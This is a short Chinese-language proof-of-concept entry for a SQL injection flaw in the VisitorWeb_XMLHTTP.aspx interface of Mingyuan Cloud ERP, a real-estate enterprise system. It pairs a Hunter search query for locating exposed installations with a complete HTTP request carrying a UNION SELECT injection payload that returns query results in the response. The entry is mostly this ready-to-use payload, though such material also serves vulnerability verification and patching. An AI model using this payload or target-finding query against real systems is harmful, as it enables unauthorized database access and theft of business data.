# 明源云ERP接口VisitorWeb_XMLHTTP.aspx存在SQL注入漏洞

明源云ERP是一款专门为房地产行业设计的企业资源计划（ERP）系统。它旨在帮助房地产公司更有效地管理其业务流程，从项目开发到销售，再到售后服务。该系统集成了财务管理、项目管理、合同管理、采购管理、销售管理等多个模块，提供端到端的解决方案。该系统某接口存在SQL注入漏洞，该漏洞可以直接执行SQL语句并且回显到数据包中。

## Hunter

```javascript
app.name="明源云 ERP"
```

## poc

```javascript
GET /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1%27+union+select+sum(3233*3323)--+z HTTP/1.1
Host: 192.168.10.2:9061
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411071134231.webp)



## 漏洞来源

- https://mp.weixin.qq.com/s/XmuRwFH1c3uE4bgb73QKsQ